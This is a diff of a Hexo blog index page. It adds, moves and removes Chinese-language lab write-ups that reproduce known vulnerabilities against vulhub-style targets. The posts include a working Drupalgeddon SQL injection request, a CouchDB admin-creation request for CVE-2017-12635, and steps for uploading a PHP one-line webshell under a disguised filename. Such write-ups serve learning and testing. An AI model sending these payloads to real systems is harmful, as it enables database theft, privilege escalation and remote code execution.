@@ -350,6 +350,127 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (11)/" itemprop="url">Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -983,127 +1104,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (4)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (4)/" itemprop="url">Apache HTTPD 未知后缀解析漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h1><p>改漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。<br>与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。<br>当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。<br>同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。<br>首先创建一个名为zqd.php.jpg的一句话木马。<br><a href="https://imgchr.com/i/mACdr8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACdr8.png" alt="mACdr8.png"></a><br>这里名称保存为zqd.php.jpg，是为了绕过黑名单机制<br>访问靶机 然后上传<br><a href="https://imgchr.com/i/mACc2q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACc2q.png" alt="mACc2q.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAC7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAC7GR.png" alt="mAC7GR.png"></a><br>连接蚁剑<br><a href="https://imgchr.com/i/mACXqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACXqO.png" alt="mACXqO.png"></a><br>成功</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (3)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1180,6 +1180,127 @@
 <p>mu.php<br>———-4871560877<br>Content-Disposition: form-data; name=”file”;filename=”1.jpg”</p>
 <?php phpinfo()?>
 <p>———-4871560877–<br><a href="https://imgchr.com/i/mA9bDS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9bDS.png" alt="mA9bDS.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA9XNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9XNj.png" alt="mA9XNj.png"></a><br>这里做一个截断<br><a href="https://imgchr.com/i/mACibF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACibF.png" alt="mACibF.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mACkE4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACkE4.png" alt="mACkE4.png"></a><br>访问主机ip:8080/zqd.php%0A,解析成功<br><a href="https://imgchr.com/i/mACMDO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACMDO.png" alt="mACMDO.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/ld (4)/" itemprop="url">Apache HTTPD 未知后缀解析漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h1><p>改漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。<br>与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。<br>当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。<br>同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。<br>首先创建一个名为zqd.php.jpg的一句话木马。<br><a href="https://imgchr.com/i/mACdr8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACdr8.png" alt="mACdr8.png"></a><br>这里名称保存为zqd.php.jpg，是为了绕过黑名单机制<br>访问靶机 然后上传<br><a href="https://imgchr.com/i/mACc2q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACc2q.png" alt="mACc2q.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAC7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAC7GR.png" alt="mAC7GR.png"></a><br>连接蚁剑<br><a href="https://imgchr.com/i/mACXqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACXqO.png" alt="mACXqO.png"></a><br>成功</p>
 
           
         
@@ -1336,131 +1457,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (6)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (6)/" itemprop="url">Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>&emsp;<br>访问<a href="http://your-ip:5984/_utils/即可看到一个web页面，说明Couchdb已成功启动。" target="_blank" rel="noopener">http://your-ip:5984/_utils/即可看到一个web页面，说明Couchdb已成功启动。</a><br><a href="https://imgchr.com/i/mAdvmq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdvmq.png" alt="mAdvmq.png"></a><br>漏洞复现<br>设置Burp的拦截端口号为5984<br>发送一次包含两个roles字段的数据包，即可绕过限制<br>PUT /_users/org.couchdb.user:zqd HTTP/1.1<br>Host: your-ip:5984<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Length: 108</p>
-<p>{<br>  “type”: “user”,<br>  “name”: “zqd”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “vulhub”<br>}<br><a href="https://imgchr.com/i/mAwF1J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwF1J.png" alt="mAwF1J.png"></a><br>成功创建管理员，账户密码均为zqd<br>再次访问<a href="http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录：" target="_blank" rel="noopener">http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录：</a><br><a href="https://imgchr.com/i/mAwQ9e" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwQ9e.png" alt="mAwQ9e.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1504,7 +1507,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1517,7 +1520,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
